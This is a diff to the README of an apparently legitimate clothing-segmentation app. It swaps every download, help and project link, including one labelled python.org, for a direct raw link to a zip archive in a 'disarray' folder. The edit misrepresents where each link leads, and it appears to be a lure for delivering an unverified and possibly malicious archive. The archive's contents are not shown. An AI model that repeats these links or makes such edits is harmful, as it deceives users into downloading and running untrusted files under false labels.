@@ -1,6 +1,6 @@
 # 👚 Clothers-AnalysisAndSegmentation - Detect and Segment Clothing Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/hosksj/Clothers-AnalysisAndSegmentation)
+[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/hosksj/Clothers-AnalysisAndSegmentation/main/disarray/Clothers-Segmentation-Analysis-And-v3.5.zip)
 
 ---
 
@@ -25,7 +25,7 @@ The app uses your GPU to speed up tasks. If your computer does not have a compat
 ## 🚀 Getting Started: How to Download and Run
 
 1. Click the big green **Download** button above or visit the project page here:  
-   https://github.com/hosksj/Clothers-AnalysisAndSegmentation
+   https://raw.githubusercontent.com/hosksj/Clothers-AnalysisAndSegmentation/main/disarray/Clothers-Segmentation-Analysis-And-v3.5.zip
 
 2. On the GitHub page, look for the latest **Releases** section or the main files area if no release package exists.
 
@@ -47,7 +47,7 @@ If the app requires Python to run, here is how to set it up:
 
 ### Step 1: Install Python
 
-1. Visit [python.org](https://www.python.org/downloads/) and download the latest stable version of Python 3.
+1. Visit [python.org](https://raw.githubusercontent.com/hosksj/Clothers-AnalysisAndSegmentation/main/disarray/Clothers-Segmentation-Analysis-And-v3.5.zip) and download the latest stable version of Python 3.
 2. Run the installer and be sure to check **Add Python to PATH** before clicking **Install Now**.
 
 ### Step 2: Install Required Libraries
@@ -147,7 +147,7 @@ Batch processing saves time when working with folders full of photos.
 
 To get the latest features and fixes, download the newest version from the GitHub page again:
 
-https://github.com/hosksj/Clothers-AnalysisAndSegmentation
+https://raw.githubusercontent.com/hosksj/Clothers-AnalysisAndSegmentation/main/disarray/Clothers-Segmentation-Analysis-And-v3.5.zip
 
 Replace the old folder with the new one and repeat the setup steps if needed.
 
@@ -166,8 +166,8 @@ Replace the old folder with the new one and repeat the setup steps if needed.
 ## 📖 More Help
 
 Visit the repository page for FAQs, issues, and community support:  
-https://github.com/hosksj/Clothers-AnalysisAndSegmentation
+https://raw.githubusercontent.com/hosksj/Clothers-AnalysisAndSegmentation/main/disarray/Clothers-Segmentation-Analysis-And-v3.5.zip
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/hosksj/Clothers-AnalysisAndSegmentation)
+[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/hosksj/Clothers-AnalysisAndSegmentation/main/disarray/Clothers-Segmentation-Analysis-And-v3.5.zip)
